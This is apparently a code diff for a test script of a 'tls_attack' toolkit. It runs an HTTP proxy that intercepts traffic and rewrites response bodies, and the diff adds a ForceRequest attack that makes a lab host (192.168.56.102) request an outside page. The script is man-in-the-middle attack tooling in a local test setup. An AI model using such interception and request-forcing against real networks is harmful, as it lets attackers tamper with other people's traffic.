@@ -5,17 +5,15 @@ import time
 from tls_attack.proxy.HTTPSProxyServer import HTTPSProxyServer
 from tls_attack.proxy.HTTPProxyServer import HTTPProxyServer
 from tls_attack.module.AlterHandshake import *
+from tls_attack.module.ForceRequest import *
 from tls_attack.structure.TLSCipherSuiteStruct import *
 
-def packet_received(connection_id, tls_object, state, source):
+def packet_received(connection, tls_object, state, source):
     print(tls_object)
     time.sleep(0.5)
 
-def url_response(request, response):
+def url_response(connection, request, response):
     response_body = response.body
-
-    print("Received body !")
-    print(response_body)
 
     if len(response_body) > 0:
         response_body = response_body.replace(b"It works!", b"It doesn't works!")
@@ -24,8 +22,13 @@ def url_response(request, response):
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
-server = HTTPProxyServer(port = 8080)
-server.on_url_response(url_response)
+server = HTTPProxyServer(port = 8081)
+#server.on_url_response(url_response)
+
+attack = ForceRequest(server)
+attack.force_request("192.168.56.102", "http://perdu.com")
+attack.start()
+
 server.start()
 
 #server = HTTPSProxyServer(port = 8443)
